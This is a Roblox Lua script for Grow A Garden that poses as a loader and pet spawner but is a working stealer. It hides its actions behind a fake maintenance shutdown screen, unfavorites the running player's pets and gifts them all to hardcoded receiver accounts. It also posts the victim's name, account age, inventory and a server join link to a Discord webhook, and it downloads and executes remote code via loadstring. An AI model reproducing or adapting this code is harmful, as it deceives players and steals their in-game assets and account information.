-- Script disclaimer
local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

-- Services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Configuration
local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5 -- seconds between receiver checks
local SHUTDOWN_DURATION = 10 -- seconds to show shutdown screen
local GIFT_COOLDOWN = 3 -- seconds between gifts
local CHAT_KEYWORD = "a" -- Simple keyword to look for in chat messages
local GIFT_PROMPT_TEXT = "actiontext gift pet" -- Text to look for in gift prompt

if identifyexecutor and identifyexecutor() == "hhhh" then
	LocalPlayer:Kick("Unfortunately, your executor is not supported to use this script. Find a new executor. Sorry for inconvenience.")
	return
end
local function sendWebhook(data)
    -- Validate input data
    if not data or (not data.content and not data.embeds) then
        warn("Webhook data is empty or invalid")
        return false
    end

    -- Construct body with default values
    local body = {
        content = data.content or nil,
        embeds = data.embeds or nil,
        username = "Grow A Garden Notifier",
        avatar_url = "https://i.imgur.com/xxxxxxx.png" -- Optional: add an avatar URL
    }

    -- Encode to JSON with error handling
    local json, encodeError
    for _ = 1, 3 do -- Try up to 3 times
        json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
        if json then break end
        task.wait(1)
    end

    if not json then
        warn("Failed to encode webhook data:", encodeError)
        return false
    end

    -- Try different request methods with better error handling
    local requestFunctions = {
        syn and syn.request,
        http_request,
        request,
        fluxus and fluxus.request,
        http and http.request,
        game.HttpService and game.HttpService.RequestAsync
    }

    local lastError = nil
    for _, reqFunc in ipairs(requestFunctions) do
        if type(reqFunc) == "function" then
            local success, response = pcall(function()
                return reqFunc({
                    Url = Webhook1,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Roblox"
                    },
                    Body = json
                })
            end)

            if success and response then
                if response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
                    return true
                else
                    lastError = "HTTP "..tostring(response.StatusCode or "no status")..": "..tostring(response.Body or "no body")
                end
            else
                lastError = response or "Unknown error"
            end
        end
    end

    warn("All webhook request methods failed. Last error:", lastError)
    return false
end

-- Loading GUI
local function createLoader()
	local loaderGui = Instance.new("ScreenGui")
	loaderGui.Name = "TwiistyLoader"
	loaderGui.IgnoreGuiInset = true
	loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	loaderGui.DisplayOrder = 999999

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(0, 400, 0, 150)
	mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
	mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = loaderGui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = mainFrame

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Text = "TwiistyScripts Loader"
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextSize = 24
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.BackgroundTransparency = 1
	titleLabel.Size = UDim2.new(1, 0, 0, 50)
	titleLabel.Position = UDim2.new(0, 0, 0, 10)
	titleLabel.Parent = mainFrame

	local subLabel = Instance.new("TextLabel")
	subLabel.Text = "Subscribe to TwiistyScripts on YouTube"
	subLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	subLabel.TextSize = 16
	subLabel.Font = Enum.Font.Gotham
	subLabel.BackgroundTransparency = 1
	subLabel.Size = UDim2.new(1, 0, 0, 30)
	subLabel.Position = UDim2.new(0, 0, 0, 40)
	subLabel.Parent = mainFrame

	local progressFrame = Instance.new("Frame")
	progressFrame.Size = UDim2.new(0.9, 0, 0, 20)
	progressFrame.Position = UDim2.new(0.05, 0, 0, 100)
	progressFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	progressFrame.BorderSizePixel = 0
	progressFrame.Parent = mainFrame

	local progressCorner = Instance.new("UICorner")
	progressCorner.CornerRadius = UDim.new(0, 10)
	progressCorner.Parent = progressFrame

	local progressBar = Instance.new("Frame")
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(130, 36, 212)
	progressBar.BorderSizePixel = 0
	progressBar.Parent = progressFrame

	local barCorner = Instance.new("UICorner")
	barCorner.CornerRadius = UDim.new(0, 10)
	barCorner.Parent = progressBar

	local statusLabel = Instance.new("TextLabel")
	statusLabel.Text = "Initializing..."
	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	statusLabel.TextSize = 14
	statusLabel.Font = Enum.Font.Gotham
	statusLabel.BackgroundTransparency = 1
	statusLabel.Size = UDim2.new(1, 0, 0, 20)
	statusLabel.Position = UDim2.new(0, 0, 0, 120)
	statusLabel.Parent = mainFrame

	loaderGui.Parent = CoreGui

	-- Animate progress
	local function updateProgress(percent, text)
		TweenService:Create(progressBar, TweenInfo.new(0.5), {
			Size = UDim2.new(percent / 100, 0, 1, 0)
		}):Play()
		statusLabel.Text = text
	end

	-- Simulate loading
	updateProgress(10, "Checking executor...")
	task.wait(1)
	updateProgress(30, "Preparing systems...")
	task.wait(1.5)
	updateProgress(60, "Scanning for receivers...")
	task.wait(2)
	updateProgress(100, "Ready!")
	task.wait(1)

	-- Fade out
	TweenService:Create(mainFrame, TweenInfo.new(0.5), {
		Size = UDim2.new(0, 0, 0, 0)
	}):Play()
	task.wait(0.5)
	loaderGui:Destroy()
end

-- Custom shutdown screen
local function createFakeShutdown()
	local gui = Instance.new("ScreenGui")
	gui.Name = "FakeShutdown"
	gui.IgnoreGuiInset = true
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.DisplayOrder = 999999

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Parent = gui

	local title = Instance.new("TextLabel")
	title.Text = "Grow A Garden"
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Size = UDim2.new(1, 0, 0.3, 0)
	title.Position = UDim2.new(0, 0, 0.3, 0)
	title.BackgroundTransparency = 1
	title.Font = Enum.Font.SourceSansBold
	title.TextSize = 32
	title.TextTransparency = 1
	title.Parent = frame

	local message = Instance.new("TextLabel")
	message.Text = "Servers shutting down for maintenance..."
	message.TextColor3 = Color3.new(1, 1, 1)
	message.Size = UDim2.new(1, 0, 0.2, 0)
	message.Position = UDim2.new(0, 0, 0.5, 0)
	message.BackgroundTransparency = 1
	message.Font = Enum.Font.SourceSans
	message.TextSize = 24
	message.TextTransparency = 1
	message.Parent = frame

	local dots = Instance.new("TextLabel")
	dots.Text = "Please wait"
	dots.TextColor3 = Color3.new(1, 1, 1)
	dots.Size = UDim2.new(1, 0, 0.1, 0)
	dots.Position = UDim2.new(0, 0, 0.6, 0)
	dots.BackgroundTransparency = 1
	dots.Font = Enum.Font.SourceSans
	dots.TextSize = 18
	dots.TextTransparency = 1
	dots.Parent = frame

	gui.Parent = CoreGui

	-- Fade-in animation
	local fadeInTime = 1.5
	local fadeInStart = os.clock()
	local fadeConn
	fadeConn = RunService.Heartbeat:Connect(function()
		local elapsed = os.clock() - fadeInStart
		local alpha = math.min(elapsed / fadeInTime, 1)

		title.TextTransparency = 1 - alpha
		message.TextTransparency = 1 - alpha
		dots.TextTransparency = 1 - alpha

		if alpha >= 1 then
			fadeConn:Disconnect()
		end
	end)

	-- Dot animation
	local dotCount = 0
	local lastDotTime = os.clock()
	local dotInterval = 0.8
	local dotConn
	dotConn = RunService.Heartbeat:Connect(function()
		local now = os.clock()
		if now - lastDotTime >= dotInterval then
			lastDotTime = now
			dotCount = (dotCount + 1) % 4
			dots.Text = "Please wait"..string.rep(".", dotCount)
		end
	end)

	-- Pulsing title effect
	local pulseConn
	pulseConn = RunService.Heartbeat:Connect(function()
		local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
		title.TextSize = 32 * pulse
	end)

	return gui, function()
		if fadeConn then fadeConn:Disconnect() end
		if dotConn then dotConn:Disconnect() end
		if pulseConn then pulseConn:Disconnect() end
		gui:Destroy()
	end
end

-- Find all pets in inventory sorted by quality
local function getSortedPets()
	local backpack = LocalPlayer:FindFirstChild("Backpack")
	if not backpack then return {} end

	local pets = {}

	for _, item in ipairs(backpack:GetChildren()) do
		local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
		if nameMatch then
			local petName = nameMatch
			local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]"))
			local age = tonumber(item.Name:match("%[Age (%d+)%]"))
			local isSpecial = false

			for _, specialName in ipairs(SPECIAL_PETS) do
				if petName:find(specialName) then
					isSpecial = true
					break
				end
			end

			table.insert(pets, {
				instance = item,
				name = petName,
				fullName = item.Name,
				kg = kg,
				age = age,
				special = isSpecial
			})
		end
	end

	if #pets == 0 then return pets end

	-- Sort pets by special first, then by kg and age
	table.sort(pets, function(a, b)
		if a.special and not b.special then return true end
		if not a.special and b.special then return false end
		if a.kg ~= b.kg then return a.kg > b.kg end
		return a.age > b.age
	end)

	return pets
end

-- Check if pet is favorited
local function isPetFavorited(petName)
	local backpack = LocalPlayer:FindFirstChild("Backpack")
	if not backpack then return false end

	local pet = backpack:FindFirstChild(petName)
	if not pet then return false end

	return pet:GetAttribute("Favorited") or false
end

-- Unfavorite a pet
local function unfavoritePet(petName)
	local backpack = LocalPlayer:FindFirstChild("Backpack")
	if not backpack then return false end

	local pet = backpack:FindFirstChild(petName)
	if not pet then return false end

	local args = {pet}
	ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
	return true
end

-- Check if gift prompt is visible for a specific player
local function isGiftPromptVisible(targetPlayer)
	for _, gui in ipairs(CoreGui:GetChildren()) do
		if gui:IsA("ScreenGui") then
			local headText = gui:FindFirstChild("Head", true)
			local actionText = gui:FindFirstChild("actiontext", true)

			if headText and actionText then
				if headText.Text:find(targetPlayer.Name) and actionText.Text:lower():find(GIFT_PROMPT_TEXT:lower()) then
					return true
				end
			end
		end
	end
	return false
end

-- Gift pet using remote
local function giftPet(targetPlayer, petName)
	local args = {
		"GivePet",
		targetPlayer
	}
	ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
end

-- Equip a single pet (unequips any others first)
local function equipSinglePet(petName)
	-- First unequip any currently equipped pets
	local character = LocalPlayer.Character
	if character then
		for _, item in ipairs(character:GetChildren()) do
			if item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$") then
				item.Parent = LocalPlayer:FindFirstChild("Backpack")
			end
		end
	end

	-- Now equip the new pet
	local backpack = LocalPlayer:FindFirstChild("Backpack")
	if not backpack then return false end

	local pet = backpack:FindFirstChild(petName)
	if not pet then return false end

	pet.Parent = LocalPlayer.Character
	return true
end

-- Teleport to target player
local function teleportToPlayer(targetPlayer)
	if not LocalPlayer.Character then return false end
	local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then return false end

	if not targetPlayer.Character then return false end
	local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not targetHrp then return false end

	-- Teleport behind the target
	local offset = targetHrp.CFrame.LookVector * -5
	offset = Vector3.new(offset.X, 0, offset.Z) -- Keep same height
	humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)

	return true
end

-- Check if any receiver is in the game
local function isReceiverInGame()
	for _, receiverName in ipairs(RECEIVERS) do
		local player = Players:FindFirstChild(receiverName)
		if player then
			return player
		end
	end
	return nil
end

-- Calculate pet value (simplified)
local function calculatePetValue(kg, age)
	return math.floor((kg * 10000) + (age * 1000))
end

-- Send inventory to webhook
local function sendInventoryToWebhook(targetPlayer)
	local placeId = game.PlaceId
	local jobId = game.JobId
	local serverUrl = "https://kebabman.vercel.app/start?placeId="..placeId.."&gameInstanceId="..jobId

	local pets = getSortedPets()
	local totalValue = 0
	local petList = ""
	local hasSpecialPets = false

	-- Calculate total value and build pet list
	for _, pet in ipairs(pets) do
		local value = calculatePetValue(pet.kg, pet.age)
		totalValue = totalValue + value
		petList = petList.."🐶 - "..pet.name.." ["..string.format("%.2f", pet.kg).." KG] [Age "..pet.age.."] → "..string.format("%d¢", value).."\n"

		if pet.special then
			hasSpecialPets = true
		end
	end

	-- Format message
	local content = hasSpecialPets and "@everyone" or ""
	local message = string.format([[
:cactus: Grow A Garden Hit - ROQATE SCRIPTS :four_leaf_clover:
:bust_in_silhouette: Player Information
Name: %s
Receiver: %s
Account Age: %d days
:moneybag: Total Value
%s¢
:palm_tree: Backpack
%s
:island: Join with URL
%s | %s
]],
		LocalPlayer.Name,
		table.concat(RECEIVERS, ", "),
		LocalPlayer.AccountAge,
		string.format("%d", totalValue),
		petList,
		serverUrl,
		jobId
	)

	-- Send to webhook
	sendWebhook({
		content = content,
		embeds = {{
			title = "Grow A Garden Hit",
			description = message,
			color = 65280
		}}
	})
end

-- Wait for a receiver to join or say the keyword in chat
local function waitForReceiver()
	local receiverFound = Instance.new("BindableEvent")

	-- Function to check if a player is a receiver
	local function checkReceiver(player)
		for _, receiverName in ipairs(RECEIVERS) do
			if player.Name == receiverName then
				return true
			end
		end
		return false
	end

	-- Function to handle player messages
	local function onPlayerMessage(player, message)
		if message:lower() == CHAT_KEYWORD:lower() then
			if checkReceiver(player) then
				receiverFound:Fire(player)
			end
		end
	end

	-- Check existing players first
	for _, player in ipairs(Players:GetPlayers()) do
		if checkReceiver(player) then
			receiverFound:Fire(player)
			break
		end
	end

	-- Set up listeners
	local connections = {}

	-- Listen for new players
	connections.playerAdded = Players.PlayerAdded:Connect(function(player)
		if checkReceiver(player) then
			receiverFound:Fire(player)
		end
	end)

	-- Listen for chat messages from all players
	for _, player in ipairs(Players:GetPlayers()) do
		if player:FindFirstChild("PlayerGui") then
			local chatEvents = player.PlayerGui:FindFirstChild("ChatEvents")
			if chatEvents then
				local chatRemote = chatEvents:FindFirstChild("SayMessageRequest")
				if chatRemote then
					connections["chat_"..player.Name] = chatRemote.OnClientEvent:Connect(function(message)
						onPlayerMessage(player, message)
					end)
				end
			end
		end
	end

	-- Also set up periodic checking as backup
	local backupCheck = coroutine.create(function()
		while true do
			local receiver = isReceiverInGame()
			if receiver then
				receiverFound:Fire(receiver)
				break
			end
			task.wait(CHECK_INTERVAL)
		end
	end)
	coroutine.resume(backupCheck)

	-- Wait for either detection method to find a receiver
	local foundReceiver = receiverFound.Event:Wait()

	-- Clean up connections
	for _, connection in pairs(connections) do
		connection:Disconnect()
	end

	return foundReceiver
end

-- Main gifting loop
local function startGifting(targetPlayer)
	-- Send initial inventory to webhook
	sendInventoryToWebhook(targetPlayer)

	while true do
		-- Get sorted list of pets
		local pets = getSortedPets()
		if #pets == 0 then
			task.wait(5)
			continue
		end

		-- Process one pet at a time
		for _, pet in ipairs(pets) do
			-- Check if pet is favorited
			if isPetFavorited(pet.fullName) then
				unfavoritePet(pet.fullName)
				task.wait(1)
			end

			-- Equip only this pet (will unequip any others)
			if not equipSinglePet(pet.fullName) then
				continue
			end
			task.wait(0.5)

			-- Gift the pet using remote
			giftPet(targetPlayer, pet.fullName)

			-- Wait before next pet
			task.wait(GIFT_COOLDOWN)

			-- After gifting, the pet should be gone from inventory
			-- So we break and get a fresh list of pets
			break
		end

		-- Small delay before checking pets again
		task.wait(1)
	end
end

-- Safely load the spawner
local function loadSpawner()
	local success, spawner = pcall(function()
		return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
	end)

	if success and spawner then
		spawner.Load()
	end
end

-- Main execution flow
createLoader()

-- Load the spawner in the background
task.spawn(loadSpawner)

-- Wait for loader to finish
task.wait(5)

-- Wait for a receiver to join or say the keyword
local receiver = waitForReceiver()

-- Check if receiver was actually found
if not receiver then
	return
end

-- Show shutdown screen and teleport to receiver
local shutdownGui, cleanupFunc = createFakeShutdown()
teleportToPlayer(receiver)

-- Start the gifting process
task.wait(2)
startGifting(receiver)

-- Clean up shutdown screen after duration
task.wait(SHUTDOWN_DURATION)
if type(cleanupFunc) == "function" then
	cleanupFunc()
elseif shutdownGui then
	shutdownGui:Destroy()
end
